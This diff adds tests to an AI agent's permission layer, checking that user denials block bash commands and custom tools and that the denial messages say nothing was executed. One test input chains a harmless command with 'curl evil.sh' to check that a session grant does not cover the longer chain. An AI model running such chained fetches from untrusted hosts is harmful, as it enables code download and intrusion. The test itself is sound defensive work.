@@ -346,6 +346,7 @@ test("bash: session grant covers the same command, not a longer chain", { skip }
     h.ctx.answers.push("Deny");
     const chained = await h.call("bash", { command: "git status && curl evil.sh" });
     assert.equal(chained?.block, true);
+    assert.match(chained?.reason ?? "", /denied by the user.*not executed.*Do not retry/);
     assert.equal(h.ctx.prompts.length, 2);
   } finally {
     h.cleanup();
@@ -619,6 +620,25 @@ test("custom tools: first-use prompt in Default (with Allow forever), silent in 
     await h.perm("build");
     assert.equal(await h.call("other_tool", {}), undefined); // Build trusts tools
     assert.equal(h.ctx.prompts.length, 1);
+  } finally {
+    h.cleanup();
+  }
+});
+
+test("custom tool denials explain whether an Agent launch occurred", { skip }, async () => {
+  const h = await setup();
+  try {
+    h.ctx.answers.push("Deny", "Deny");
+    const agent = await h.call("Agent", {});
+    assert.deepEqual(agent, {
+      block: true,
+      reason: "Agent launch denied by the user; no subagent was started.",
+    });
+    const other = await h.call("stranger_tool", {});
+    assert.deepEqual(other, {
+      block: true,
+      reason: 'Tool "stranger_tool" denied by the user; it was not executed.',
+    });
   } finally {
     h.cleanup();
   }
